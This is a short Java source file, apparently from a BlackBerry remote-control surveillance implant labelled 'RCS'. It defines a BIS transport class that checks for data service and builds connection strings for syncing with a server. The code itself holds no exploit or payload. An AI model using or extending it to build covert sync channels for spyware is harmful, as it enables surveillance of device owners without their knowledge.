//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	

package blackberry.action.sync.transport;

import net.rim.device.api.system.CoverageInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class BisTransport extends HttpTransport {
    
    //#ifdef DEBUG
    private static Debug debug = new Debug("BisTransport", DebugLevel.VERBOSE);
    //#endif
    
    public BisTransport(String host) {
        super(host);
    }

    public boolean isAvailable() {
        //#ifdef DEBUG
        debug.trace("isAvailable");
        //#endif
        boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
        boolean coverage = CoverageInfo.isCoverageSufficient(CoverageInfo.COVERAGE_BIS_B);
        
        //#ifdef DEBUG
        debug.trace("isAvailable bis: " + gprs + " & " + coverage);
        //#endif

        
        return gprs;
    }

    protected String getSuffix() {
        return ";deviceside=false;ConnectionType=mds-public";
    }
    
    public String toString() {
        return "BisTransport " + host ;
    }
}
